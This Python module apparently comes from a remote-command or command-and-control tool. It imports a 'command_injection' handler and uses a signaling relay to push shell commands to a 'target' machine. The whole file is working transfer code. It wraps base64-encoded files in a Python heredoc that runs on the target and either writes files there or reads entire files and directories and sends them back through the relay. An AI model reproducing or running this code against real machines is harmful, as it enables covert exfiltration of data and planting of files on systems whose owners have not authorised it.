import base64
import json
import textwrap
from pathlib import Path

from core.client import client_id, username
from core.config import HOST, ROOM
from signaling.signal import SignalClient
from command_injection.injector import RemoteCommandHandler as SenderHandler


def build_transfer_payload(source_path, remote_path, mode="upload"):
    source = Path(source_path)
    if not source.exists():
        raise FileNotFoundError(f"Path not found: {source_path}")

    remote_path = str(remote_path)

    if source.is_file():
        data = source.read_bytes()
        return {
            "type": "file-transfer",
            "mode": mode,
            "path": remote_path,
            "is_directory": False,
            "size": len(data),
            "content": base64.b64encode(data).decode("ascii"),
        }

    if source.is_dir():
        files = {}
        for path in sorted(source.rglob("*")):
            if path.is_file():
                rel_path = path.relative_to(source).as_posix()
                files[rel_path] = base64.b64encode(path.read_bytes()).decode("ascii")

        return {
            "type": "file-transfer",
            "mode": mode,
            "path": remote_path,
            "is_directory": True,
            "content": files,
        }

    raise ValueError(f"Unsupported path type: {source_path}")


def build_transfer_command(payload):
    payload_json = json.dumps(payload)
    script = textwrap.dedent(
        f"""
        import base64
        import json
        import os
        from pathlib import Path

        payload = json.loads({payload_json!r})
        path = payload["path"]

        if payload.get("mode") == "upload":
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            if payload.get("is_directory"):
                target.mkdir(parents=True, exist_ok=True)
                for rel_path, encoded in payload.get("content", {{}}).items():
                    file_path = target / rel_path
                    file_path.parent.mkdir(parents=True, exist_ok=True)
                    file_path.write_bytes(base64.b64decode(encoded))
            else:
                target.write_bytes(base64.b64decode(payload["content"]))
            print(json.dumps({{"status": "success", "path": path, "mode": "upload"}}))
        else:
            source = Path(path)
            if source.is_file():
                data = source.read_bytes()
                response = {{
                    "type": "file-transfer",
                    "mode": "download",
                    "path": path,
                    "is_directory": False,
                    "size": len(data),
                    "content": base64.b64encode(data).decode("ascii"),
                }}
            elif source.is_dir():
                files = {{}}
                for item in sorted(source.rglob("*")):
                    if item.is_file():
                        rel_path = item.relative_to(source).as_posix()
                        files[rel_path] = base64.b64encode(item.read_bytes()).decode("ascii")
                response = {{
                    "type": "file-transfer",
                    "mode": "download",
                    "path": path,
                    "is_directory": True,
                    "content": files,
                }}
            else:
                raise FileNotFoundError(path)
            print(json.dumps(response))
        """
    )
    return f"python3 - <<'PY'\n{script}\nPY"


async def _run_transfer(target, payload, timeout=60):
    signal = SignalClient(ROOM, client_id, HOST, username=username)
    await signal.connect()

    sender = SenderHandler(signal)

    try:
        return await sender.send_command(
            target=target,
            command=build_transfer_command(payload),
            wait_for_result=True,
            timeout=timeout,
        )
    finally:
        await signal.close()


async def upload_file(target, local_path, remote_path=None):
    local_path = Path(local_path)
    if remote_path is None:
        remote_path = local_path.name

    payload = build_transfer_payload(local_path, remote_path, mode="upload")
    result = await _run_transfer(target, payload)

    if result is None:
        print("[-] No response received for file upload")
        return

    if result.get("status") == "success":
        print(f"[+] Upload completed to {remote_path}")
    else:
        print("[-] Upload failed")
        print("ERROR:", result.get("error", "Unknown error"))


async def download_file(target, remote_path, local_path=None):
    if local_path is None:
        local_path = Path(remote_path).name

    payload = {
        "type": "file-transfer",
        "mode": "download",
        "path": str(remote_path),
    }
    result = await _run_transfer(target, payload)

    if result is None:
        print("[-] No response received for file download")
        return

    if result.get("status") != "success":
        print("[-] Download failed")
        print("ERROR:", result.get("error", "Unknown error"))
        return

    try:
        response = json.loads(result.get("output", "{}"))
    except json.JSONDecodeError:
        print("[-] Invalid download payload received")
        return

    destination = Path(local_path)
    destination.parent.mkdir(parents=True, exist_ok=True)

    if response.get("is_directory"):
        destination.mkdir(parents=True, exist_ok=True)
        for rel_path, encoded in response.get("content", {}).items():
            file_path = destination / rel_path
            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_bytes(base64.b64decode(encoded))
    else:
        destination.write_bytes(base64.b64decode(response.get("content", "")))

    print(f"[+] Download completed to {destination}")